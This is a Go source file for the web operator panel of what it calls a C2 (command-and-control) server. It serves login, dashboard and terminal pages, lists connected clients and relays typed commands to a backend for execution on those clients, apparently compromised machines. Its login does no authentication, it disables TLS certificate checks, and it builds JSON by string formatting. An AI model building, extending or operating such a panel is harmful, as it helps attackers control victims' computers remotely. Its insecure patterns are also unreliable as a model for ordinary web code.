package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/labstack/echo/v4"
)

type cmdForm struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"`
}

func sendCommandToC2(c echo.Context) error {
	cmdJson := cmdForm{}
	fmt.Println(c.Request().Body)
	/*
		in := bufio.NewReader(os.Stdin)
		text, err := in.ReadString('\n')
		command := strings.Replace(text, " ", "+", -1)
		command = command[:len(command)-2]
	*/

	err := json.NewDecoder(c.Request().Body).Decode(&cmdJson)
	if err != nil {
		fmt.Printf(err.Error())
	}

	//jsonStr, err := json.Marshal(c.Request().Body)
	//fmt.Println(string(jsonStr))
	fmt.Printf("\n")

	fmt.Printf(cmdJson.Cmd)
	url := "https://" + "localhost:443" + "/getCommand"
	fmt.Printf(url)

	body := fmt.Sprintf(`
	{
		"id":"%s",
		"cmd":"%s"
	}
	`, cmdJson.ID, cmdJson.Cmd)
	fmt.Printf(body)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	response, err := client.Post(url, "application/json", bytes.NewBufferString(body))
	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()

	content, _ := ioutil.ReadAll(response.Body)
	fmt.Printf(string(content))
	return c.String(http.StatusOK, string(content))
}

func main() {
	e := echo.New()

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	e.Static("/", "static/")
	/*
		e.Use(middleware.StaticWithConfig(middleware.StaticConfig{
			Root:       "static/",
			Browse:     false,
			IgnoreBase: true,
		}))*/

	/*e.Use(middleware.KeyAuth(func(key string, c echo.Context) (bool, error) {
		return key == "123", nil
	}))*/

	e.GET("/ready", func(c echo.Context) error {
		link := "https://localhost:443/sendClientsTable"

		client := &http.Client{Transport: tr}

		response, err := client.Get(link)
		if err != nil {
			fmt.Println(err)
		}
		defer response.Body.Close()

		content, _ := ioutil.ReadAll(response.Body)
		/*s := strings.TrimSpace(string(content))
		fmt.Printf(s)*/

		return c.HTML(http.StatusOK, string(content))
	})
	e.GET("/", func(c echo.Context) error {
		return c.File("static/login.html")
	})
	e.GET("/dashboard", func(c echo.Context) error {
		return c.File("static/dashboard.html")
	})
	e.GET("/remote", func(c echo.Context) error {
		uid := c.QueryParam("uid")
		link := fmt.Sprintf("https://localhost:443/checkUser/%s", uid)
		fmt.Printf(uid)
		client := &http.Client{Transport: tr}

		response, err := client.Get(link)
		if err != nil {
			fmt.Println(err)
		}
		defer response.Body.Close()

		content, _ := ioutil.ReadAll(response.Body)
		fmt.Printf(string(content))

		if string(content) == "Ok" {
			return c.File("static/term.html")
		} else {
			return c.String(http.StatusBadRequest, "Incorrect id")
		}
	})
	e.POST("/login", func(c echo.Context) error {
		//usr := c.FormValue("Username")
		//key := c.FormValue("key")
		return c.Redirect(http.StatusTemporaryRedirect, "/dashboard")

	})
	e.POST("/sendCmd", sendCommandToC2)
	e.Logger.Fatal(e.StartTLS(":7777", "../cert.pem", "../key.pem"))
}
